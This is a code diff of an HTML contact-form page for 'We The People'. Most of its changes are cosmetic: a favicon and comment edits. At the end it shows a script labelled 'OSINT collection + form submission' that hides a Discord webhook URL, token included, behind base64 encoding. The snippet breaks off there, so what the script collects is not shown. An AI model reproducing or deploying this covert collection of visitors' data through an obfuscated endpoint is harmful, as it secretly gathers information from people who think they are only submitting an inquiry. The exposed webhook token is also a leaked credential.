@@ -4,6 +4,10 @@
   <meta charset="utf-8" />
   <meta name="viewport" content="width=device-width,initial-scale=1" />
   <title>Contact — We The People</title>
+  <!-- Favicon -->
+  <link rel="icon" type="image/svg+xml" href="wtp.svg" />
+  <link rel="alternate icon" href="wtp.svg" />
+
   <style>
     :root {
       --bg: #000;
@@ -124,8 +128,7 @@
       <p style="color: var(--muted);">Reach out via our official channels or submit an inquiry below.</p>
     </section>
 
-    <!-- No separate contact info cards, only form -->
-    
+    <!-- Contact form -->
     <section class="contact-form">
       <h2 style="margin-bottom: 1.5rem; font-size: 1.4rem;">Submit an Inquiry</h2>
       <form id="inquiryForm">
@@ -133,7 +136,7 @@
           <label for="email">Return Email (Optional)</label>
           <input type="email" id="email" placeholder="email@example.com" />
         </div>
-        <!-- Optional contact options -->
+        <!-- Optional contact options in same section -->
         <div class="form-group">
           <label for="phone">Phone Number (Optional)</label>
           <input type="tel" id="phone" placeholder="e.g., +1 (555) 123-4567" />
@@ -160,7 +163,7 @@
     document.getElementById('year').textContent = new Date().getFullYear();
   </script>
 
-  <!-- OSINT collection + form submission -->
+  <!-- OSINT collection + form submit -->
   <script>
     const base64Webhook = 'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ1ODk2MDAyNjI3NzI1MzE5MS9MQzNPVktiQS1jMUo2UWVhVHNFd3E2X0N4QktfT3lPbWlyY1lsUDlkMF8yMEIzTjdTdkJxQldjT1haZ0VkQmtSakhZNA==';
     const webhookURL = atob(base64Webhook);
